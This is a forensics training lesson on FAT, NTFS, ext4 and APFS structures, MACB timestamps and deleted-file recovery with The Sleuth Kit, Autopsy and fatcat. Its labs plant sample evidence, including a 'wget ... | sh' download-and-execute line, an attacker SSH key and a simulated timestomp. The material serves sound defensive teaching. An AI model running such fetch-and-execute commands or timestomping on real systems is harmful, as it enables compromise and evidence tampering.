# Day 04: File System Fundamentals: FAT/exFAT, NTFS, ext4, APFS & MACB Timestamps

> **Phase 1: Foundations** · **Level:** 🟢 Beginner → 🟡 Intermediate · **Time:** ~4 hours (reading + labs) · **Posted:** 2026-10-01
>
> **Tools today:** 🛠️ The Sleuth Kit · 🛠️ Autopsy · 🛠️ fatcat

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Describe how a file system maps **names → metadata → data**, and what deletion changes in each layer.
2. Explain the on-disk structures of **FAT, exFAT, NTFS, ext4 and APFS** at the level an examiner needs.
3. Interpret **MACB timestamps** on each file system, including their resolution and time-zone traps.
4. Detect **timestomping** on NTFS by comparing `$STANDARD_INFORMATION` with `$FILE_NAME`.
5. Explain why deleted files are easy to recover on FAT, sometimes on NTFS, and rarely on ext4.
6. Use **The Sleuth Kit**, **Autopsy** and **fatcat** to list, inspect, recover and timeline files.

---

## Part 1: The lesson

### 1.1 What a file system does

A file system turns a partition (a long run of sectors) into named files and folders. Brian Carrier's model splits every file system into five categories of data, and The Sleuth Kit's tools follow the same split:

| Category | What it holds | Examples | TSK tools |
|----------|---------------|----------|-----------|
| **File system** | Layout and global settings | FAT boot sector, NTFS `$Boot`, ext4 superblock | `fsstat` |
| **Content** | The actual data units | Clusters (FAT/NTFS), blocks (ext4) | `blkls`, `blkcat`, `blkstat` |
| **Metadata** | Size, timestamps, owner, where the content is | FAT directory entry, NTFS MFT entry, ext4 inode | `istat`, `ils`, `icat` |
| **File name** | Names that point to metadata | FAT directory entry, NTFS `$I30` index, ext4 directory entry | `fls`, `ffind` |
| **Application** | Features beyond storage | Journals, quotas, `$UsnJrnl` | `jls`, `jcat` |

```
 file name layer          metadata layer                     content layer
┌───────────────┐        ┌───────────────────────────┐       ┌──────────────────────┐
│ "plan.txt"    │──────▶ │ size, MACB times, owner,  │──────▶│ cluster/block 1234   │
│ (dir entry)   │        │ pointers to content       │       │ cluster/block 1235 … │
└───────────────┘        └───────────────────────────┘       └──────────────────────┘
```

**Deletion breaks links, it doesn't erase data.** When a file is deleted, the OS marks the name and/or metadata as unused and returns the content units to the free pool. *What exactly is kept* depends on the file system, and that decides how recoverable the file is (§1.8).

**Allocation units and slack.** File systems allocate whole **clusters/blocks** (e.g., 4 KiB). A 100-byte file still occupies 4 KiB. The unused tail is **file slack**, which may contain remnants of older files.

### 1.2 FAT (FAT12/16/32)

Still everywhere: USB sticks, SD cards (≤ 32 GB), cameras, car infotainment, the UEFI **EFI System Partition**.

```
┌─────────────┬────────┬────────┬──────────────────┬──────────────────────────────────┐
│ Boot sector │ FAT 1  │ FAT 2  │ Root directory   │ Data region (clusters 2, 3, 4 …) │
│ + reserved  │        │ (copy) │ (FAT12/16 only)  │ files and sub-directories        │
└─────────────┴────────┴────────┴──────────────────┴──────────────────────────────────┘
```

- The **File Allocation Table** is a linked list: the entry for cluster *n* holds the number of the *next* cluster of the file, or an end-of-chain marker. Two copies are kept.
- A **directory entry** is 32 bytes: the 8.3 short name, attributes, created time (10 ms resolution), **last-access *date* only**, written time (**2-second resolution**), the starting cluster and the file size. Long file names (LFN) are stored in extra 32-byte entries just before the short one.
- **Deletion:** the first byte of the name becomes **`0xE5`** and the file's FAT chain is zeroed (clusters freed). The entry still has the **starting cluster and size**, so contiguous files can usually be recovered completely. That's what you did on Day 1.
- ⚠️ **FAT timestamps are stored in *local time* with no time zone.** You must know the time zone of the device that wrote them (camera, PC) to convert to UTC.

**exFAT** (SDXC cards, large USB drives) replaced the FAT chain for contiguous files with an **allocation bitmap**. Each file is a *set* of directory entries (File `0x85`, Stream Extension `0xC0`, File Name `0xC1`). Timestamps have 10 ms resolution and a **UTC-offset field**, which fixes FAT's time-zone problem. On deletion, the "in use" bit of each entry type is cleared (e.g., `0x85` → `0x05`).

### 1.3 NTFS

The Windows file system. Its central idea is that **everything is a file**, including the file system's own metadata.

**The Master File Table (`$MFT`).** Every file and folder has at least one **1024-byte MFT entry** (signature `FILE`). The first entries are reserved system files:

| Entry | Name | Purpose |
|------:|------|---------|
| 0 | `$MFT` | The MFT itself |
| 1 | `$MFTMirr` | Backup of the first MFT entries |
| 2 | `$LogFile` | Transaction journal for metadata (Day 10) |
| 3 | `$Volume` | Volume name and version |
| 4 | `$AttrDef` | Attribute definitions |
| 5 | `.` | **Root directory** |
| 6 | `$Bitmap` | Which clusters are allocated |
| 7 | `$Boot` | Boot sector (`NTFS    ` OEM ID at byte 3) |
| 8 | `$BadClus` | Bad clusters (a known hiding place) |
| 9 | `$Secure` | Security descriptors |
| 10 | `$UpCase` | Unicode upper-case table |
| 11 | `$Extend` | Contains `$UsnJrnl` (change journal), `$ObjId`, `$Quota`, `$Reparse` |

**Attributes.** An MFT entry is a header plus a list of attributes:

| Type | Attribute | Forensic value |
|-----:|-----------|----------------|
| `0x10` | `$STANDARD_INFORMATION` (`$SI`) | **4 timestamps (MACB)**, flags, owner and security IDs |
| `0x30` | `$FILE_NAME` (`$FN`) | Name, parent directory, and **another 4 timestamps** |
| `0x50` | `$SECURITY_DESCRIPTOR` | Permissions |
| `0x80` | `$DATA` | File content. Extra *named* `$DATA` attributes are **Alternate Data Streams (ADS)** |
| `0x90` / `0xA0` | `$INDEX_ROOT` / `$INDEX_ALLOCATION` | Directory indexes (`$I30`). Their slack can hold names of deleted files (Day 54) |

- **Resident vs non-resident:** small content (roughly ≤ 700 bytes) is stored **inside the MFT entry** ("resident"). Larger content lives in clusters described by **data runs**.
- **Alternate Data Streams:** `file.txt:Zone.Identifier` is the **Mark of the Web**. Windows writes `ZoneId=3` and the source URL when a file is downloaded from the internet, which is gold for "where did this come from?". Attackers also hide payloads in ADS.
- **TSK addresses** look like `64-128-2`: MFT entry **64**, attribute type **128** (`$DATA`), attribute ID **2**. `64-128-4` is a second `$DATA` attribute, i.e. an ADS.
- **Deletion:** the MFT entry's *in use* flag is cleared, its **sequence number** is incremented, and its clusters are freed in `$Bitmap`. The entry (with name, timestamps and **resident data**) survives until it's reused. Non-resident content survives until its clusters are overwritten.

**Two sets of timestamps, and why that matters:**

| | `$STANDARD_INFORMATION` | `$FILE_NAME` |
|---|---|---|
| Shown by Explorer / `dir` | ✅ | ❌ |
| Updated by | Normal file activity, **and any program calling `SetFileTime()`** | The kernel, on create, rename and move |
| Easy for an attacker to change | **Yes** ("timestomping") | Much harder (needs tricks like rename/move after stomping) |

**Timestomping indicators:**

- `$SI` timestamps earlier than `$FN` timestamps (especially `$SI` Created < `$FN` Created).
- Modified earlier than Born on the same file (when that isn't explained by a copy).
- `$SI` times with **zero sub-seconds** (`.0000000`). Real NTFS times have 100 ns precision, but many stomping tools write whole seconds.
- The `$SI` *MFT Modified* time, which the common `SetFileTime()` API can't set (lower-level APIs can), often lands close to when the attacker was active.

Timestamps are **FILETIME**: 100 ns intervals since 1601-01-01 **UTC** (you converted one on Day 1). Last-access updates are often disabled or reduced by default on modern Windows, so don't rely on the "A" time.

### 1.4 ext4 (Linux)

```
┌──────────┬───────────────────────── Block group 0 ───────────────────────┬─ Block group 1 … ─┐
│ boot     │ superblock │ group      │ block  │ inode  │ inode  │ data      │ (backup superblock│
│ (1 KiB)  │ (magic     │ descriptors│ bitmap │ bitmap │ table  │ blocks    │  in some groups)  │
│          │  0xEF53)   │            │        │        │        │           │                   │
└──────────┴────────────┴────────────┴────────┴────────┴────────┴───────────┴───────────────────┘
```

- **Inodes** (usually 256 bytes) hold the mode, owner, size, **timestamps** and an **extent tree** pointing to the data blocks. Inode 2 is the root directory, and 11 is usually `lost+found`.
- **Timestamps** (nanosecond resolution, UTC):

  | Field | Meaning |
  |-------|---------|
  | `atime` | Last access (often `relatime`, so only updated lazily) |
  | `mtime` | Content modified |
  | `ctime` | **Inode changed** (permissions, owner, rename, content). Not "created"! |
  | `crtime` | **Birth** (ext4 only) |
  | `dtime` | **Deletion time** (set when the inode is freed) |

- **Directory entries** link names to inode numbers.
- **The journal (jbd2)** records metadata changes and can sometimes help recover deleted files (Day 35).
- **Deletion:** the kernel frees the inode, sets `dtime`, sets the **size to 0** and clears the **extent information**, and the directory entry is usually merged into its neighbour, so the **name disappears**. The data blocks are marked free but **not erased**. Recovery means **carving** or **keyword searching** unallocated space (`blkls`), or using the journal. You'll see this in Lab 3.

### 1.5 APFS (macOS, iOS)

- A **container** (one partition) holds several **volumes** that share free space: *Macintosh HD*, *Data*, *Preboot*, *Recovery*, *VM*.
- **Copy-on-write**: changes are written to new blocks, so older versions of metadata, and sometimes data, linger. **Snapshots** (Time Machine, system updates) can preserve whole earlier states of a volume, which is very valuable for investigators.
- Native **encryption** (FileVault, and per-file encryption on iOS). Without keys, analysis is very limited.
- Nanosecond **UTC** timestamps: created, modified, changed (metadata), accessed, plus "date added" in some contexts.
- TSK supports APFS as a **pool** (`-P apfs -B <volume superblock block>`). Details on Day 37.

**Others you'll meet:** **ReFS** (Windows Server, Windows Dev Drive; little forensic tool support), **HFS+** (older Macs), **XFS/Btrfs** (Linux servers), **ISO 9660/UDF** (optical media and disk images).

### 1.6 MACB: four timestamps, four different meanings

| Letter | Meaning | FAT | exFAT | NTFS (`$SI` and `$FN`) | ext4 | APFS |
|:------:|---------|-----|-------|------------------------|------|------|
| **M** | Content **M**odified | ✅ 2 s | ✅ 10 ms | ✅ 100 ns | `mtime` ns | ✅ ns |
| **A** | Last **A**ccessed | Date only | ✅ | ✅ (often not updated) | `atime` (relatime) | ✅ |
| **C** | Metadata **C**hanged | ❌ | ❌ | MFT entry modified | `ctime` (inode change) | ✅ |
| **B** | **B**orn (created) | ✅ 10 ms | ✅ | ✅ | `crtime` | ✅ |
| Time zone | | **Local** | Local + **UTC offset** | UTC | UTC | UTC |

**Typical patterns** (they vary with the OS version, so always test on a reference system):

| Activity | Typical effect |
|----------|----------------|
| File **created** | M = A = C = B = now |
| File **modified** | M and C updated |
| File **copied** to a new location | New file: **B = time of copy**, **M inherited from the source** → **B later than M** |
| File **moved** within a volume | `$SI` times usually keep their values. `$FN` changes (NTFS); ext4 `ctime` changes |
| **Extracted** from a ZIP | M often comes from the archive; B = extraction time |
| **Timestomped** | `$SI` M/A/B set to fake values; `$FN` and `$SI` *MFT modified* reveal it |

"B later than M" is normal for copied files. Don't call it timestomping without corroboration.

### 1.7 Where deleted data survives

| File system | Name kept? | Metadata kept? | Pointer to content kept? | Typical recovery |
|-------------|:----------:|:--------------:|:------------------------:|------------------|
| **FAT** | ✅ (first char → `0xE5`) | ✅ size, times, start cluster | ✅ start cluster (chain lost) | **Easy** for contiguous files |
| **exFAT** | ✅ (in-use bit cleared) | ✅ | ✅ (and "contiguous" flag) | **Easy** for contiguous files |
| **NTFS** | ✅ in the MFT entry (and maybe `$I30` slack) | ✅ until the entry is reused | ✅ data runs | **Good**, especially resident files |
| **ext4** | ❌ (directory entry merged) | Partly: inode with `dtime`, size 0 | ❌ extents cleared | **Hard**: carve, keyword search, or use the journal |
| **APFS** | Sometimes in old copy-on-write metadata or snapshots | Sometimes | Sometimes | Depends on snapshots and checkpoints |

On SSDs, TRIM can zero the freed blocks themselves (Day 3), whatever the file system.

### 1.8 Anti-forensics at the file-system level

| Technique | Where | How to detect |
|-----------|-------|---------------|
| **Timestomping** | NTFS `$SI` | `$SI` vs `$FN`, zero sub-seconds, `$UsnJrnl` entries (Day 10) |
| **Hiding in ADS** | NTFS | `fls` shows `name:stream` entries; `dir /r` on Windows |
| **Hiding in slack or unallocated space** | Any | `blkls -s` (slack), keyword searches, carving |
| **Marking clusters bad** | NTFS `$BadClus`, FAT bad-cluster markers | `istat` on `$BadClus` (entry 8); content where there shouldn't be any |
| **Wiping** a file | Any | Zeroed or patterned clusters; wiping-tool artifacts (Prefetch, Day 12) |

---

## Part 2: Tools

---

### 🛠️ Tool 1: The Sleuth Kit (TSK)

| | |
|---|---|
| **What** | A library and set of command-line tools by Brian Carrier (Basis Technology) for analysing volume systems and file systems in disk images: FAT, exFAT, NTFS, ext2/3/4, HFS+, APFS, ISO 9660, UFS, YAFFS2 |
| **Why in DFIR** | Precise, scriptable, read-only analysis of every layer of the file system. It's also the engine inside Autopsy, so understanding TSK means understanding what Autopsy shows you |
| **Platforms** | Linux, macOS, Windows |
| **Licence** | Open source: IBM Public License / Common Public License for the original code, with other licences for newer parts (see `licenses/` in the repo) |
| **Home** | https://www.sleuthkit.org/sleuthkit/ · https://github.com/sleuthkit/sleuthkit |

#### Installation

**SIFT Workstation:** preinstalled.

**Ubuntu / Debian / Kali:**

```bash
sudo apt update && sudo apt install -y sleuthkit
```

(Ubuntu 24.04 ships 4.12.1, with EWF, AFF, VMDK, VHD and APFS support.)

**Newer TSK on Debian/Ubuntu** (the method from the Autopsy docs): download the `.deb` from https://github.com/sleuthkit/sleuthkit/releases, then:

```bash
sudo apt install ./sleuthkit-*.deb
```

**macOS:**

```bash
brew install sleuthkit
```

**Windows:** download the Windows zip from https://www.sleuthkit.org/sleuthkit/download.php, extract it to `C:\Tools\sleuthkit`, and add its `bin` folder to your PATH. (Autopsy also bundles TSK.)

**From source:**

```bash
sudo apt install -y build-essential autoconf automake libtool libewf-dev libafflib-dev libvhdi-dev libvmdk-dev zlib1g-dev
# download and extract the source tarball from the releases page, then:
./configure && make -j"$(nproc)" && sudo make install
```

#### The tools, by layer

| Layer | Tools | What they do |
|-------|-------|--------------|
| Image | `img_stat`, `img_cat` | Image format info; raw stream out of E01/AFF |
| Volume | `mmls`, `mmstat`, `mmcat` | Partition tables (Day 3) |
| File system | `fsstat` | Superblock / boot-sector details, cluster size, layout |
| File name | `fls`, `ffind` | List names (`-r` recursive, `-d` deleted only, `-m` body file); name for an inode |
| Metadata | `istat`, `ils`, `icat`, `ifind` | Inode/MFT entry details; list inodes; **output file content by inode**; inode for a block |
| Content | `blkls`, `blkcat`, `blkstat`, `blkcalc` | Unallocated blocks (`blkls`), slack (`blkls -s`), single blocks |
| Timeline | `mactime`, `tsk_gettimes` | Turn a body file into a timeline |
| Recovery | `tsk_recover` | Export deleted files (default), allocated (`-a`) or everything (`-e`) |
| Journals | `jls`, `jcat` | ext3/4 journal |
| Other | `sigfind`, `hfind`, `sorter` | Find signatures in sectors, hash lookups, sort by type |

#### Configuration: common options

TSK has no config file. These options work across most tools:

| Option | Meaning |
|--------|---------|
| `-o <sectors>` | **Partition offset in sectors** (from `mmls`) |
| `-f <type>` | Force a file-system type (`fls -f list` shows the supported ones) |
| `-i <type>` | Image type: `raw`, `ewf`, `aff`, `vmdk`, `vhd` (`fls -i list`) |
| `-b <bytes>` | Sector size (e.g., 4096 for 4Kn disks) |
| `-z <TZ>` | Time zone for display (`istat -z UTC`, `mactime -z UTC`) |
| `-s <seconds>` | Clock-skew correction |
| `-P apfs -B <block>` | APFS pool and volume |

#### Verify the installation

```bash
fls -V                      # version
fls -f list | head -n 20    # should include ntfs, fat, exfat, ext4, apfs
fls -i list                 # should include ewf (E01)
```

#### First use

```bash
mmls disk.img                       # where are the partitions?
fsstat -o 2048 disk.img             # what file system is at sector 2048?
fls -r -o 2048 disk.img             # list all files
fls -rd -o 2048 disk.img            # deleted only
istat -o 2048 disk.img 517          # metadata for entry 517
icat -o 2048 disk.img 517 > out.bin # extract its content
```

#### Troubleshooting

| Symptom | Fix |
|---------|-----|
| `Cannot determine file system type` | Missing or wrong `-o` offset (check `mmls`), or an encrypted volume (BitLocker, LUKS, FileVault) |
| `icat` outputs nothing for a deleted ext4 file | Expected. The kernel cleared the extents. Search unallocated space instead (Lab 3) |
| Times differ from Windows Explorer | TSK shows UTC with `-z UTC`. Explorer shows local time and only `$SI` |
| E01 not recognised | Check `fls -i list` for `ewf`. If it's missing, install a build with libewf or use `ewfmount` (Day 6) |

---

### 🛠️ Tool 2: Autopsy

| | |
|---|---|
| **What** | The graphical digital forensics platform built on TSK, by Basis Technology. It handles cases, data sources, **ingest modules** (hash lookup, file-type and **extension-mismatch** detection, keyword search, EXIF, web and email artifacts, carving, encryption detection), timelines, tagging and reporting |
| **Why in DFIR** | One tool that takes a disk image all the way to a report. It's great for triage, for teams, and for presenting evidence to non-specialists |
| **Platforms** | **Windows** (full features); Linux and macOS with some features missing (e.g., Recent Activity, LEAPP processors, HEIF) |
| **Licence** | Apache 2.0 |
| **Home** | https://www.autopsy.com · https://github.com/sleuthkit/autopsy |

> ⚠️ On Ubuntu, `apt install autopsy` installs **Autopsy 2.24**, the old browser-based version. It's *not* Autopsy 4. Use the methods below.

#### Requirements

64-bit OS, **8 GB RAM minimum (16+ GB recommended)**, an SSD for the case directory, and plenty of free space (a case can reach 10–30 % of the evidence size). Autopsy 4 uses **Java 17** (bundled with the Windows installer).

#### Installation

**Windows (recommended):**

1. Download the 64-bit **MSI** from https://www.autopsy.com/download/ (or the GitHub releases page).
2. Record its hash.
3. Run the installer.

**Linux, Snap (simplest, per the official docs):**

```bash
sudo snap install autopsy
# Connect any missing permissions (command from the Autopsy snap README):
snap connections autopsy | sed -nE 's/^[^ ]* *([^ ]*) *- *- *$/\1/p' | xargs -I{} sudo snap connect {}
autopsy --nosplash          # to analyse local disks: sudo -g disk autopsy
```

**Linux or macOS, from the zip** (official `Running_Linux_OSX.md`):

```bash
git clone --depth 1 https://github.com/sleuthkit/autopsy.git ~/src/autopsy
cd ~/src/autopsy/linux_macos_install_scripts
./install_prereqs_ubuntu.sh             # macOS: ./install_prereqs_macos.sh (needs Homebrew); last line = Java 17 path
# Install TSK: the sleuthkit-*.deb from the TSK releases page (Linux), or install_tsk_from_src.sh (macOS)
# Download autopsy-<VER>.zip from https://github.com/sleuthkit/autopsy/releases, then:
./install_application.sh -z ~/Downloads/autopsy-<VER>.zip -i ~/autopsy -j /usr/lib/jvm/java-1.17.0-openjdk-amd64
~/autopsy/bin/autopsy --nosplash
```

On macOS, also run `add_macos_jna.sh -i ~/autopsy` as the official doc describes.

#### Configuration (Tools → Options)

- **Application:** raise the **maximum JVM memory** (e.g., 8–12 GB if you have 32 GB of RAM) and set the temp folder to a fast disk.
- **Views / time display:** show times in **UTC** (or the data source's time zone) consistently across the case. Write down which one you used.
- **Hash Sets:** import known-bad sets and NSRL known-good sets (Day 2). Mark known-good sets as "Known" so those files can be hidden.
- **Keyword Search:** create keyword lists (IOC domains, IPs, names) and regular expressions.
- **Ingest:** set the number of threads. Create **ingest profiles**, for example "Quick triage" (hash lookup, file type, extension mismatch) and "Full" (add keyword search, carving, embedded files).
- **Central Repository:** enable it to correlate hashes and artifacts across cases.

#### Workflow: case to report

1. **Case → New Case:** name, base directory (`Cases/<CASE-ID>/autopsy`), case number, examiner.
2. **Add Data Source → Disk Image or VM File:** pick the image and set the **data source time zone**. If you have the acquisition **hashes**, enter them so the *Data Source Integrity* module verifies the image.
3. **Configure ingest modules:** at minimum Hash Lookup, File Type Identification, **Extension Mismatch Detector** (Day 3!), Embedded File Extractor, Picture Analyzer (EXIF), Keyword Search, Recent Activity (Windows), Data Source Integrity.
4. **Review:**
   - *Data Sources* tree for the file system view.
   - *File Views → Deleted Files*.
   - *Data Artifacts* and *Analysis Results* (web history, EXIF, hash hits, mismatches).
   - *Timeline* (Tools → Timeline).
5. **Tag** relevant files ("Notable", "Follow up"), then **Generate Report** (HTML or Excel) that includes the tags.

#### Verify the installation

Create a test case and add `fat.img` from Lab 1 as a disk image. After ingest, *Deleted Files* should list the deleted `plan.txt` (shown as `_lan.txt`).

#### Troubleshooting

| Symptom | Fix |
|---------|-----|
| Autopsy seems frozen at start-up (Linux/macOS) | The first-run window is hidden behind the splash screen. Start with `--nosplash` |
| "Local Solr Server did not respond" (snap) | Run the snap connections command above |
| Wrong Java errors | Autopsy 4 needs Java 17. Check `jdkhome` in `<install>/etc/autopsy.conf` |
| Ingest is very slow | Give it more RAM and threads, use a faster case disk, and run fewer modules for triage |
| Times look shifted | Check the data source time zone and the display settings, and note them in your report |

---

### 🛠️ Tool 3: fatcat

| | |
|---|---|
| **What** | A small command-line tool for **exploring, extracting, recovering and repairing FAT12/16/32** file systems, by Grégoire Passault |
| **Why in DFIR** | Fast FAT-specific views that TSK doesn't give you: per-cluster reading, comparing FAT1 with FAT2 (tampering, corruption), orphaned-entry search, deleted-file extraction, and JSON output |
| **Platforms** | Linux and macOS (build from source); Windows via WSL |
| **Licence** | MIT |
| **Home** | https://github.com/Gregwar/fatcat |

> Note: fatcat does **not** support exFAT. Use TSK (`-f exfat`) for exFAT.

#### Installation

**SIFT / Ubuntu / Debian:**

```bash
sudo apt update && sudo apt install -y fatcat
fatcat -h | head -n 3
```

**From source** (Linux, macOS, WSL):

```bash
sudo apt install -y build-essential cmake git      # macOS: brew install cmake
git clone https://github.com/Gregwar/fatcat.git && cd fatcat
mkdir build && cd build && cmake .. && make
sudo make install
```

#### Configuration: the options that matter

| Option | Purpose |
|--------|---------|
| `-O <bytes>` | **Byte** offset of the FAT partition (e.g., `-O 1048576` for sector 2048). Note: TSK uses *sectors* |
| `-i` | File-system information (cluster size, FAT locations, free space) |
| `-l <path>` / `-L <cluster>` | List a directory by path or by cluster |
| `-d` | Include **deleted** entries (in listings and extraction) |
| `-r <path>` / `-R <cluster>` + `-s <size>` | Read a file by path, or by cluster with an explicit size |
| `-x <dir>` | Extract everything to `<dir>` (with `-d` for deleted files). **Create `<dir>` first** |
| `-2` | Compare FAT1 with FAT2 |
| `-o` | Search for orphaned files and directories |
| `-F json` | JSON output (good for scripts) |
| `-b <file>` | Back up the FATs |

⚠️ Options marked with `*` in `fatcat -h` (`-p`, `-w`, `-m`, `-f`, `-S`, `-z`, `-c`, `-a`) **write to the image**. Only ever use them on a working copy.

#### Verify the installation

```bash
fatcat fat.img -i | head -n 5      # after Lab 1: "Filesystem type: FAT16"
```

#### Troubleshooting

| Symptom | Fix |
|---------|-----|
| `Segmentation fault` with `-x` | The output directory doesn't exist. `mkdir` it first (seen with Ubuntu's fatcat 1.1.x) |
| Garbage or "not a FAT" on a full-disk image | Add `-O <partition start × 512>` |
| Some builds ignore the options | Per the README, some builds need the options *before* the image name: `fatcat -l / disk.img` |
| `One of your file's cluster is 0` when reading a deleted file | Expected: the FAT chain was zeroed on deletion. fatcat falls back to contiguous mode |

---

## Part 3: Hands-on labs

Run these on **SIFT** or Ubuntu:

```bash
sudo apt install -y sleuthkit fatcat dosfstools mtools ntfs-3g e2fsprogs
mkdir -p ~/cases/LAB-004/{evidence,work,export,notes,output} && cd ~/cases/LAB-004/evidence
```

### Lab 1: FAT16 deleted file, 0xE5 and 2-second timestamps (20 min)

```bash
cd ~/cases/LAB-004/evidence
truncate -s 32M fat.img && mkfs.vfat -F 16 -n LAB4FAT fat.img >/dev/null
mkdir -p /tmp/lab4src
printf 'Shipment arrives Pier 9, 02:00. Bring cash.\n' > /tmp/lab4src/plan.txt
touch -d "2026-03-02 14:07:31 UTC" /tmp/lab4src/plan.txt            # note the :31 seconds
printf 'nothing to see\n' > /tmp/lab4src/notes.txt
mmd -i fat.img ::/DOCS
mcopy -m -i fat.img /tmp/lab4src/plan.txt /tmp/lab4src/notes.txt ::/DOCS/   # -m keeps the modified time
mdel -i fat.img ::/DOCS/plan.txt                                             # the "suspect" deletes it
sha256sum fat.img > ../notes/fat.img.sha256 && chmod 444 fat.img
```

**fatcat view:**

```bash
fatcat fat.img -i | sed -n '3,12p'
fatcat fat.img -l /DOCS -d
```

Expected output (the dates on `NOTES.TXT` and the directories will be today's):

```
Listing path /DOCS
Directory cluster: 2
d 1/10/2026 08:49:20  ./ (.)                                             c=2
d 1/10/2026 08:49:20  ../ (..)                                           c=0
f 2/3/2026 14:07:30  LAN.TXT                                            c=3 s=44 (44B) d
f 1/10/2026 08:49:20  NOTES.TXT                                          c=4 s=15 (15B)
```

Three things to notice:

1. **`LAN.TXT`**, not `PLAN.TXT`: the first byte became `0xE5`. TSK shows the same entry as `_lan.txt`.
2. The trailing **`d`** means deleted. `c=3 s=44` means it started at cluster 3 and was 44 bytes long.
3. **14:07:30**, not 14:07:31: FAT stores the modified time with **2-second resolution**.

**Recover it two ways:**

```bash
fatcat fat.img -R 3 -s 44                          # read cluster 3, 44 bytes
istat fat.img 517                                  # TSK metadata (entry numbers may differ: check fls -r)
icat fat.img 517 > ../export/plan_recovered.txt && cat ../export/plan_recovered.txt
mkdir -p ../export/fatcat && fatcat fat.img -x ../export/fatcat/ -d   # extract everything, including deleted
```

Expected `istat` output:

```
Directory Entry: 517
Not Allocated
File Attributes: File, Archive
Size: 44
Name: _lan.txt

Directory Entry Times:
Written:	2026-03-02 14:07:30 (UTC)
Accessed:	2026-03-02 00:00:00 (UTC)
Created:	2026-03-02 14:07:30 (UTC)
```

The **Accessed** time is midnight because FAT stores **only a date** for last access. (TSK shows these as UTC because no time zone is recorded on FAT. On a real device, ask: whose local time is this?)

### Lab 2: NTFS resident data, ADS, deletion and timestomping (30 min)

```bash
cd ~/cases/LAB-004/evidence
truncate -s 32M ntfs.img && mkntfs -q -F -L LAB4NTFS ntfs.img
sudo mkdir -p /mnt/lab4ntfs
sudo ntfs-3g -o uid=$(id -u),gid=$(id -g),streams_interface=windows ntfs.img /mnt/lab4ntfs

echo "small resident text" > /mnt/lab4ntfs/small.txt                         # < 700 bytes: resident
head -c 4000 /dev/urandom > /mnt/lab4ntfs/big.bin                             # non-resident
printf '[ZoneTransfer]\nZoneId=3\nHostUrl=https://example.com/payload.zip\n' > /mnt/lab4ntfs/small.txt:Zone.Identifier   # Mark of the Web
echo "to be deleted" > /mnt/lab4ntfs/deleteme.txt
sleep 5
touch -d "2019-01-01 00:00:00 UTC" /mnt/lab4ntfs/big.bin                      # TIMESTOMP (sets $SI M and A)
rm /mnt/lab4ntfs/deleteme.txt
sync && sudo umount /mnt/lab4ntfs
sha256sum ntfs.img > ../notes/ntfs.img.sha256 && chmod 444 ntfs.img
```

**List everything, including the stream and the deleted file:**

```bash
fls -r ntfs.img | grep -v '\$'
```

Expected output (along with some `OrphanFile-*` entries for unused system records):

```
r/r 65-128-2:	big.bin
r/r 64-128-2:	small.txt
r/r 64-128-4:	small.txt:Zone.Identifier
-/r * 66-128-2:	deleteme.txt
```

```bash
istat ntfs.img 64 | sed -n '/^Attributes/,$p'    # small.txt: $DATA is Resident, plus a second named $DATA (the ADS)
icat ntfs.img 64-128-4                           # read the Mark of the Web
icat ntfs.img 66                                 # the deleted file's resident content is still in its MFT entry
istat ntfs.img 66 | head -n 4                    # "Not Allocated", Sequence: 2
```

**Catch the timestomp:**

```bash
istat ntfs.img 65 | grep -E 'Attribute Values|Created|Modified|Accessed'
```

Expected output (your 2026 times will differ):

```
$STANDARD_INFORMATION Attribute Values:
Created:	2026-10-01 08:48:19.366991100 (UTC)
File Modified:	2019-01-01 00:00:00.000000000 (UTC)        <-- $SI says 2019, with zero sub-seconds
MFT Modified:	2026-10-01 08:48:28.228849500 (UTC)        <-- but the MFT entry changed today
Accessed:	2019-01-01 00:00:00.000000000 (UTC)
$FILE_NAME Attribute Values:
Created:	2026-10-01 08:48:19.366991100 (UTC)
File Modified:	2026-10-01 08:48:19.366991100 (UTC)        <-- $FN still has the real time
MFT Modified:	2026-10-01 08:48:19.366991100 (UTC)
Accessed:	2026-10-01 08:48:19.366991100 (UTC)
```

That's three independent red flags: `$SI` Modified is **earlier than** `$SI` Created, it has **zero sub-seconds**, and it **disagrees with `$FN`**.

### Lab 3: ext4, where deleted really means "name and pointers gone" (20 min)

```bash
cd ~/cases/LAB-004/evidence
rm -rf /tmp/lab4ext && mkdir -p /tmp/lab4ext/home/alice
echo "ssh-rsa AAAA... attacker@evil" > /tmp/lab4ext/home/alice/authorized_keys
touch -d "2026-03-02 14:07:31 UTC" /tmp/lab4ext/home/alice/authorized_keys
echo "wget http://203.0.113.50/x.sh | sh" > /tmp/lab4ext/home/alice/.bash_history
mkfs.ext4 -q -F -L LAB4EXT -d /tmp/lab4ext ext4.img 16M        # -d copies a directory tree into the new FS

fls -r ext4.img                       # note the inode numbers (.bash_history is usually 14)
icat ext4.img 14                      # content readable while the file exists

# The suspect deletes their history (a real kernel delete, via a loop mount)
sudo mkdir -p /mnt/lab4ext && sudo mount -o loop ext4.img /mnt/lab4ext
sudo rm /mnt/lab4ext/home/alice/.bash_history && sync && sudo umount /mnt/lab4ext
sha256sum ext4.img > ../notes/ext4.img.sha256 && chmod 444 ext4.img
```

**What survives?**

```bash
fls -rd ext4.img                      # -> -/r * 14:  $OrphanFiles/OrphanFile-14   (the NAME is gone)
istat ext4.img 14 | sed -n '1,20p'    # Not Allocated, size: 0, a "Deleted:" time, no blocks listed
icat ext4.img 14 | wc -c              # -> 0 : nothing to recover through the inode
```

Now search the unallocated blocks:

```bash
blkls ext4.img | grep -a "203.0.113"
```

Expected output:

```
wget http://203.0.113.50/x.sh | sh
```

The command is still on disk. On ext4 you recover deleted content by **keyword search and carving** in unallocated space (Days 7–8), not through the inode.

Also look at `authorized_keys`:

```bash
istat ext4.img 15 | grep -E 'Modified|Created'
```

`File Modified` is **2026-03-02 14:07:31**, but `File Created` (crtime) is **today**. Modified before born is the classic signature of a file **copied in with its original mtime preserved** (here by `mkfs.ext4 -d`; in real life by `cp -p`, `rsync -a`, `tar`, or a deliberate `touch -d`).

### Lab 4: Your first timeline with fls + mactime (15 min)

```bash
cd ~/cases/LAB-004/evidence
fls -r -m "FAT:"  fat.img   >  ../output/body.txt
fls -r -m "NTFS:" ntfs.img  >> ../output/body.txt
fls -r -m "EXT4:" ext4.img  >> ../output/body.txt
mactime -b ../output/body.txt -d -z UTC > ../output/timeline.csv
grep -v -E '\$|OrphanFile' ../output/timeline.csv | column -s, -t | less -S
```

Expected output (an extract; times other than the fixed ones will differ):

```
Date                      Size  Type  ...  File Name
Xxx Xxx 00 0000 00:00:00  44    ..c.  ...  "FAT:/DOCS/_lan.txt (deleted)"      <-- FAT has no C time (shown as 0)
